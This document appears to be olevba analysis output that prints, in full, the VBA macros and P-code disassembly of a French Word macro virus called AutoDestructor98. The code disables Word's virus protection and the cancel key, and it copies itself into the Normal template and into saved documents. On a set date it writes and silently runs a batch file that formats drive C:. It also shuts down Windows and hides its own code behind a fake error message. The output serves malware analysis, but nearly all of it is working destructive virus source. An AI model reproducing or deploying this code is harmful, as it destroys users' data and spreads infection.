olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Autodestructor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Autodestructor - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoDestructor98.bas 
in file: Virus.MSWord.Autodestructor - OLE stream: 'Macros/VBA/AutoDestructor98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 5)
D1$ = Mid(MyDate, 1, 2)
If D$ = "13/07" Then
    With Application.Assistant
        .Visible = True
    End With
    With Assistant.NewBalloon
        .Text = "Attention, le compte à rebours est lancé..." & Chr$(13) & "Plus que 10 secondes"
        .Heading = "Virus AutoDestructor98"
        .Animation = msoAnimationGetAttentionMajor
        .Button = msoButtonSetOK
        .Show
    End With
StatusBar = "10"
Call CpteAReb
StatusBar = "9"
Call CpteAReb
StatusBar = "8"
Call CpteAReb
StatusBar = "7"
Call CpteAReb
StatusBar = "6"
Call CpteAReb
StatusBar = "5"
Call CpteAReb
StatusBar = "4"
Call CpteAReb
StatusBar = "3"
Call CpteAReb
StatusBar = "2"
Call CpteAReb
StatusBar = "1"
Call CpteAReb
StatusBar = "0"
Open "C:\DOS\Boum.bat" For Output As #1
    Print #1, "@Echo off"
    Print #1, "CLS"
    Print #1, "Echo o|Format C: /u /Autotest"
    Print #1, "Echo y|Format C: /u /Autotest"
    Print #1, "Echo Votre ordinateur s'est autodétruit, HAHAHAHAHA!!!!!"
Close #1
Shell "C:\DOS\Boum.bat", vbHide
BoumBox.Show
End If
If D1$ = "15" Then
    Application.ActiveWindow.Caption = "Les barres de scrollings ont disparu..."
    Application.ActiveWindow.DisplayHorizontalScrollBar = False
    Application.ActiveWindow.DisplayVerticalScrollBar = False
Else
    Application.ActiveWindow.DisplayHorizontalScrollBar = True
    Application.ActiveWindow.DisplayVerticalScrollBar = True
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "AutoDestructor98" Then
        AutoDestructor98Installed = -1
    End If
Next i
If Not AutoDestructor98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AutoDestructor98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="BoumBox", Object:=wdOrganizerObjectProjectItems
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "HAHAHAHAHA!!!, votre ordinateur est infecté par un nouveau virus..."
    .Heading = "Virus AutoDestructor98"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
End If
ErrorAO:
End Sub
Sub CpteAReb()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorCAR
Dim PauseTime, Start, Finish, TotalTime
    PauseTime = 1   ' Définit la durée.
    Start = Timer   ' Définit l'heure de début.
    Do While Timer < Start + PauseTime
        DoEvents    ' Donne le contrôle à d'autres
                    ' processus.
    Loop
ErrorCAR:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoDestructor98", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="BoumBox", Object:=wdOrganizerObjectProjectItems
Application.ActiveWindow.Caption = "Document infecté, HAHAHAHAHA!!!!!!"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
StatusBar = "10"
Call CpteAReb
StatusBar = "9"
Call CpteAReb
StatusBar = "8"
Call CpteAReb
StatusBar = "7"
Call CpteAReb
StatusBar = "6"
Call CpteAReb
StatusBar = "5"
Call CpteAReb
StatusBar = "4"
Call CpteAReb
StatusBar = "3"
Call CpteAReb
StatusBar = "2"
Call CpteAReb
StatusBar = "1"
Call CpteAReb
StatusBar = "0"
MsgBox "Charge activée...", vbCritical, "Virus AutoDestructor98"
Selection.EndKey
For i = 1 To 100
Selection.TypeParagraph
Selection.TypeText Text:="Boum!!!!!!!!!"
Next i
Selection.TypeParagraph
Selection.TypeText Text:="Je m'appelle AutoDestructor98 et je vais détruire votre ordinateur..."
Selection.TypeParagraph
Selection.TypeText Text:="HAHAHAHAHA!!!!!!!!!!"
ActiveDocument.Save
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
StatusBar = "Compte à rebours déclenché plus que 10 secondes..."
StatusBar = "Veuillez observer la barre de titre..."
Application.ActiveWindow.Caption = "10"
Call CpteAReb
Application.ActiveWindow.Caption = "9"
Call CpteAReb
Application.ActiveWindow.Caption = "8"
Call CpteAReb
Application.ActiveWindow.Caption = "7"
Call CpteAReb
Application.ActiveWindow.Caption = "6"
Call CpteAReb
Application.ActiveWindow.Caption = "5"
Call CpteAReb
Application.ActiveWindow.Caption = "4"
Call CpteAReb
Application.ActiveWindow.Caption = "3"
Call CpteAReb
Application.ActiveWindow.Caption = "2"
Call CpteAReb
Application.ActiveWindow.Caption = "1"
Call CpteAReb
Application.ActiveWindow.Caption = "0"
MsgBox "Au revoir...", vbCritical, "Virus AutoDestructor98"
Tasks.ExitWindows
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "Microsoft Visual Basic n'est pas installé." & Chr$(13) & "Veuillez consulter l'aide en ligne."
    .Heading = "Microsoft Word"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO BoumBox.frm 
in file: Virus.MSWord.Autodestructor - OLE stream: 'Macros/VBA/BoumBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload BoumBox
End Sub
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Autodestructor
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/AutoDestructor98 - 15295 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAE 
' Line #6:
' 	Dim 
' 	VarDefn MyDate
' Line #7:
' 	Ld Date 
' 	St MyDate 
' Line #8:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #9:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D1$ 
' Line #10:
' 	Ld D$ 
' 	LitStr 0x0005 "13/07"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Assistant 
' 	With 
' Line #12:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #13:
' 	EndWith 
' Line #14:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #15:
' 	LitStr 0x002B "Attention, le compte à rebours est lancé..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0014 "Plus que 10 secondes"
' 	Concat 
' 	MemStWith Then 
' Line #16:
' 	LitStr 0x0016 "Virus AutoDestructor98"
' 	MemStWith Heading 
' Line #17:
' 	Ld msoAnimationGetAttentionMajor 
' 	MemStWith Animation 
' Line #18:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #19:
' 	ArgsMemCallWith Show 0x0000 
' Line #20:
' 	EndWith 
' Line #21:
' 	LitStr 0x0002 "10"
' 	St StatusBar 
' Line #22:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #23:
' 	LitStr 0x0001 "9"
' 	St StatusBar 
' Line #24:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #25:
' 	LitStr 0x0001 "8"
' 	St StatusBar 
' Line #26:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #27:
' 	LitStr 0x0001 "7"
' 	St StatusBar 
' Line #28:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #29:
' 	LitStr 0x0001 "6"
' 	St StatusBar 
' Line #30:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #31:
' 	LitStr 0x0001 "5"
' 	St StatusBar 
' Line #32:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #33:
' 	LitStr 0x0001 "4"
' 	St StatusBar 
' Line #34:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #35:
' 	LitStr 0x0001 "3"
' 	St StatusBar 
' Line #36:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #37:
' 	LitStr 0x0001 "2"
' 	St StatusBar 
' Line #38:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #39:
' 	LitStr 0x0001 "1"
' 	St StatusBar 
' Line #40:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #41:
' 	LitStr 0x0001 "0"
' 	St StatusBar 
' Line #42:
' 	LitStr 0x000F "C:\DOS\Boum.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@Echo off"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Echo o|Format C: /u /Autotest"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Echo y|Format C: /u /Autotest"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "Echo Votre ordinateur s'est autodétruit, HAHAHAHAHA!!!!!"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #49:
' 	LitStr 0x000F "C:\DOS\Boum.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #50:
' 	Ld BoumBox 
' 	ArgsMemCall Show 0x0000 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld D1$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LitStr 0x0027 "Les barres de scrollings ont disparu..."
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayHorizontalScrollBar 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayVerticalScrollBar 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayHorizontalScrollBar 
' Line #58:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt DisplayVerticalScrollBar 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Label ErrorAE 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub AutoOpen())
' Line #63:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #64:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #67:
' 	OnError ErrorAO 
' Line #68:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #69:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #70:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0010 "AutoDestructor98"
' 	Eq 
' 	IfBlock 
' Line #71:
' 	LitDI2 0x0001 
' 	UMi 
' 	St AutoDestructor98Installed 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	Ld AutoDestructor98Installed 
' 	Not 
' 	IfBlock 
' Line #75:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0010 "AutoDestructor98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #76:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "BoumBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #77:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Assistant 
' 	With 
' Line #78:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #79:
' 	EndWith 
' Line #80:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #81:
' 	LitStr 0x0043 "HAHAHAHAHA!!!, votre ordinateur est infecté par un nouveau virus..."
' 	MemStWith Then 
' Line #82:
' 	LitStr 0x0016 "Virus AutoDestructor98"
' 	MemStWith Heading 
' Line #83:
' 	Ld msoAnimationGetAttentionMajor 
' 	MemStWith Animation 
' Line #84:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #85:
' 	ArgsMemCallWith Show 0x0000 
' Line #86:
' 	EndWith 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Label ErrorAO 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub CpteAReb())
' Line #91:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #92:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #93:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #94:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #95:
' 	OnError ErrorCAR 
' Line #96:
' 	Dim 
' 	VarDefn PauseTime
' 	VarDefn Start
' 	VarDefn Finish
' 	VarDefn TotalTime
' Line #97:
' 	LitDI2 0x0001 
' 	St PauseTime 
' 	QuoteRem 0x0014 0x0012 " Définit la durée."
' Line #98:
' 	Ld Timer 
' 	St Start 
' 	QuoteRem 0x0014 0x001A " Définit l'heure de début."
' Line #99:
' 	Ld Timer 
' 	Ld Start 
' 	Ld PauseTime 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #100:
' 	ArgsCall DoEvents 0x0000 
' 	QuoteRem 0x0014 0x001D " Donne le contrôle à d'autres"
' Line #101:
' 	QuoteRem 0x0014 0x000B " processus."
' Line #102:
' 	Loop 
' Line #103:
' 	Label ErrorCAR 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub FileSaveAs())
' Line #106:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #107:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #108:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #109:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #110:
' 	OnError ErrorFSA 
' Line #111:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #112:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #113:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0010 "AutoDestructor98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #116:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "BoumBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #117:
' 	LitStr 0x0022 "Document infecté, HAHAHAHAHA!!!!!!"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #118:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #119:
' 	Label ErrorFSA 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub FileTemplates())
' Line #122:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #123:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #124:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #125:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #126:
' 	OnError ErrorFT 
' Line #127:
' 	LitStr 0x0002 "10"
' 	St StatusBar 
' Line #128:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #129:
' 	LitStr 0x0001 "9"
' 	St StatusBar 
' Line #130:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #131:
' 	LitStr 0x0001 "8"
' 	St StatusBar 
' Line #132:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #133:
' 	LitStr 0x0001 "7"
' 	St StatusBar 
' Line #134:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #135:
' 	LitStr 0x0001 "6"
' 	St StatusBar 
' Line #136:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #137:
' 	LitStr 0x0001 "5"
' 	St StatusBar 
' Line #138:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #139:
' 	LitStr 0x0001 "4"
' 	St StatusBar 
' Line #140:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #141:
' 	LitStr 0x0001 "3"
' 	St StatusBar 
' Line #142:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #143:
' 	LitStr 0x0001 "2"
' 	St StatusBar 
' Line #144:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #145:
' 	LitStr 0x0001 "1"
' 	St StatusBar 
' Line #146:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #147:
' 	LitStr 0x0001 "0"
' 	St StatusBar 
' Line #148:
' 	LitStr 0x0011 "Charge activée..."
' 	Ld vbCritical 
' 	LitStr 0x0016 "Virus AutoDestructor98"
' 	ArgsCall MsgBox 0x0003 
' Line #149:
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0000 
' Line #150:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #151:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #152:
' 	LitStr 0x000D "Boum!!!!!!!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #153:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #155:
' 	LitStr 0x0045 "Je m'appelle AutoDestructor98 et je vais détruire votre ordinateur..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #156:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #157:
' 	LitStr 0x0014 "HAHAHAHAHA!!!!!!!!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #158:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #159:
' 	Label ErrorFT 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub ToolsMacro())
' Line #162:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #163:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #164:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #165:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #166:
' 	OnError ErrorTM 
' Line #167:
' 	LitStr 0x0032 "Compte à rebours déclenché plus que 10 secondes..."
' 	St StatusBar 
' Line #168:
' 	LitStr 0x0026 "Veuillez observer la barre de titre..."
' 	St StatusBar 
' Line #169:
' 	LitStr 0x0002 "10"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #170:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #171:
' 	LitStr 0x0001 "9"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #172:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #173:
' 	LitStr 0x0001 "8"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #174:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #175:
' 	LitStr 0x0001 "7"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #176:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #177:
' 	LitStr 0x0001 "6"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #178:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #179:
' 	LitStr 0x0001 "5"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #180:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #181:
' 	LitStr 0x0001 "4"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #182:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #183:
' 	LitStr 0x0001 "3"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #184:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #185:
' 	LitStr 0x0001 "2"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #186:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #187:
' 	LitStr 0x0001 "1"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #188:
' 	ArgsCall (Call) CpteAReb 0x0000 
' Line #189:
' 	LitStr 0x0001 "0"
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #190:
' 	LitStr 0x000C "Au revoir..."
' 	Ld vbCritical 
' 	LitStr 0x0016 "Virus AutoDestructor98"
' 	ArgsCall MsgBox 0x0003 
' Line #191:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #192:
' 	Label ErrorTM 
' Line #193:
' 	EndSub 
' Line #194:
' 	FuncDefn (Sub ViewVBCode())
' Line #195:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #196:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #197:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #198:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #199:
' 	OnError ErrorVVBC 
' Line #200:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Assistant 
' 	With 
' Line #201:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #202:
' 	EndWith 
' Line #203:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #204:
' 	LitStr 0x002A "Microsoft Visual Basic n'est pas installé."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0023 "Veuillez consulter l'aide en ligne."
' 	Concat 
' 	MemStWith Then 
' Line #205:
' 	LitStr 0x000E "Microsoft Word"
' 	MemStWith Heading 
' Line #206:
' 	Ld msoAnimationGetAttentionMajor 
' 	MemStWith Animation 
' Line #207:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #208:
' 	ArgsMemCallWith Show 0x0000 
' Line #209:
' 	EndWith 
' Line #210:
' 	Label ErrorVVBC 
' Line #211:
' 	EndSub 
' Macros/VBA/BoumBox - 2641 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld BoumBox 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub userform_initialize())
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
33333f33�33�33�f3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
